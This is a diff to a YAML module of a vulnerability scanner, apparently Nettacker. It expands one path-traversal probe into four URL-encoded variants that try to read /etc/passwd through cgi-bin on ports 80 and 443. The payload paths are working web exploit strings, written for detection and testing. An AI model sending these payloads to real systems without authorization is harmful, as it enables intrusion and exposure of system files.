@@ -30,18 +30,22 @@ payloads:
           User-Agent: "{user_agent}"
         url:
           nettacker_fuzzer:
-            input_format: "{{schema}}://{target}:{{ports}}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+            input_format: "{{schema}}://{target}:{{ports}}/path"
             prefix: ""
             suffix: ""
             interceptors:
             data:
+              path:
+                - "cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+                - "cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd"
+                - "cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd"
+                - "cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
               schema:
                 - "http"
                 - "https"
               ports:
                 - 80
                 - 443
-
         response:
           condition_type: and
           conditions:
